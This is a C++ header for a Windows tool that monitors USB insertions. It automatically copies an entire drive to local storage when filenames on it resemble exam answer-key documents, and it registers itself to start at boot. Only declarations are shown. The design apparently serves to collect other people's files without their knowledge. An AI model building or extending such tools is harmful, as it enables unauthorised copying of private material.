#ifndef USB_MONITOR_H
#define USB_MONITOR_H

#include <windows.h>
#include <dbt.h>
#include <string>
#include <map>
#include <vector>

/**
 * @brief USB 设备监控器类
 * 
 * 监控 Windows 系统下的 USB 设备插拔事件，并根据预定义规则处理不同类型的 U 盘：
 * - U 盘 A：通过文件名模糊匹配识别，将整个 U 盘内容复制到本地
 * - U 盘 B：通过标识文件识别，将本地文件同步回 U 盘
 */
class USBMonitor {
public:
    USBMonitor();
    ~USBMonitor();

    /**
     * @brief 初始化监控器
     * @return true 初始化成功，false 失败
     */
    bool Initialize();

    /**
     * @brief 运行消息循环
     */
    void Run();

private:
    // ==================== 窗口和托盘相关 ====================
    HWND hwnd_;                      ///< 消息窗口句柄
    HDEVNOTIFY hDevNotify_;          ///< 设备通知句柄
    NOTIFYICONDATA trayIconData_;    ///< 托盘图标数据

    // ==================== 配置常量 ====================
    static constexpr const char* USB_A_SEARCH_PATTERNS[] = {
        "选三 U8 答案版分课时打印.doc",
        "微点",
        "选二 U4 答案版"
    };
    static constexpr int USB_A_PATTERN_COUNT = 3;
    static constexpr const char* USB_B_IDENTIFIER_FILE = "USBB_IDENTIFIER.txt";
    static constexpr DWORD MIN_PROCESS_INTERVAL_MS = 3000;  ///< 防重复处理间隔（毫秒）
    static constexpr double SIMILARITY_THRESHOLD = 0.3;     ///< 文件名相似度阈值

    // ==================== 目录路径 ====================
    std::string logDir_;      ///< 日志目录
    std::string saveDir_;     ///< 文件保存目录（可自定义，默认为程序根目录）
    std::string downloadsDir_; ///< 下载文件夹目录

    // ==================== 防重复处理机制 ====================
    std::map<std::string, DWORD> lastProcessTime_;  ///< 记录每个驱动器的最后处理时间

    // ==================== 进度跟踪变量 ====================
    int totalFilesToCopy_;           ///< 待复制文件总数
    int copiedFilesCount_;           ///< 已复制文件数
    int totalDirectoriesToCreate_;   ///< 待创建目录总数
    int createdDirectoriesCount_;    ///< 已创建目录数

    // ==================== 字符串处理工具方法 ====================
    /**
     * @brief 标准化字符串（转小写、移除空格和标点）
     */
    std::string NormalizeString(const std::string& str);

    /**
     * @brief 计算两个字符串的相似度（基于 Levenshtein 距离）
     * @return 相似度百分比 (0.0-1.0)
     */
    double CalculateStringSimilarity(const std::string& str1, const std::string& str2);

    /**
     * @brief 计算 Levenshtein 编辑距离
     */
    int LevenshteinDistance(const std::string& str1, const std::string& str2);

    // ==================== 日志和调试方法 ====================
    /**
     * @brief 写入日志
     */
    void WriteLog(const std::string& message);

    /**
     * @brief 检查并设置开机自启动
     */
    void CheckAndSetAutoStart();

    /**
     * @brief 创建系统托盘图标
     */
    bool CreateTrayIcon();

    // ==================== 设备事件处理方法 ====================
    /**
     * @brief 处理设备变化事件
     */
    void HandleDeviceChange(WPARAM wParam, LPARAM lParam);

    /**
     * @brief 处理 USB 插入事件
     */
    void OnUSBInserted(DWORD unitmask);

    /**
     * @brief 扫描所有现有驱动器
     */
    void ScanAllDrives();

    /**
     * @brief 检查是否最近处理过该驱动器
     */
    bool IsRecentlyProcessed(const std::string& drivePath);

    /**
     * @brief 处理 USB 设备
     */
    void ProcessUSBDevice(const std::string& drivePath);

    /**
     * @brief 检查文件是否存在
     */
    bool FileExists(const std::string& filepath);

    /**
     * @brief 按模式搜索文件（支持模糊匹配）
     */
    bool SearchFileByPattern(const std::string& directory, const std::string& pattern);

    /**
     * @brief 处理 U 盘 A（复制到本地）
     */
    void HandleUSBA(const std::string& usbPath);

    /**
     * @brief 处理下载文件夹（仅复制匹配文件到本地）
     */
    void HandleDownloadsFolder();

    /**
     * @brief 处理 U 盘 B（从本地同步到 U 盘）
     */
    void HandleUSBB(const std::string& usbPath);

    // ==================== 配置管理方法 ====================
    /**
     * @brief 加载配置文件
     */
    void LoadConfig();

    /**
     * @brief 保存配置文件
     */
    void SaveConfig();

    // ==================== 文件复制方法 ====================
    /**
     * @brief 复制整个 U 盘到本地
     */
    void CopyEntireUSBToLocal(const std::string& usbRoot, const std::string& localDir);

    /**
     * @brief 从下载文件夹复制匹配文件到本地
     */
    void CopyMatchingFilesFromDownloads(const std::string& downloadsRoot, const std::string& localDir);

    /**
     * @brief 复制目录（带文件大小比较，保留较大版本）
     */
    void CopyDirectoryWithSizeComparison(const std::string& srcDir, 
                                         const std::string& destDir, 
                                         bool isRoot = false);

    /**
     * @brief 复制目录到 U 盘
     */
    void CopyDirectoryToUSB(const std::string& srcDir, 
                           const std::string& destDir, 
                           bool isRoot = false);

    /**
     * @brief 判断是否应该跳过该文件
     */
    bool ShouldSkipFile(const std::string& fileName, DWORD attributes);

    /**
     * @brief 获取文件大小（64 位）
     */
    ULONGLONG GetFileSize64(const std::string& filePath);

    // ==================== 辅助方法 ====================
    /**
     * @brief 检查设备状态
     */
    void CheckDeviceStatus(const std::string& drivePath);

    /**
     * @brief 统计文件和目录数量
     */
    void CountFilesAndDirectories(const std::string& directory, 
                                  int& fileCount, 
                                  int& dirCount);

    /**
     * @brief 显示进度信息
     */
    void ShowProgress(const std::string& operation, int current, int total);

    /**
     * @brief 记录操作摘要
     */
    void LogSummary(const std::string& operation, const std::map<std::string, int>& stats);

    /**
     * @brief 清理资源
     */
    void Cleanup();

    /**
     * @brief 处理窗口消息
     */
    LRESULT HandleMessage(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam);

    /**
     * @brief 窗口过程回调（静态）
     */
    static LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam);
};

#endif // USB_MONITOR_H
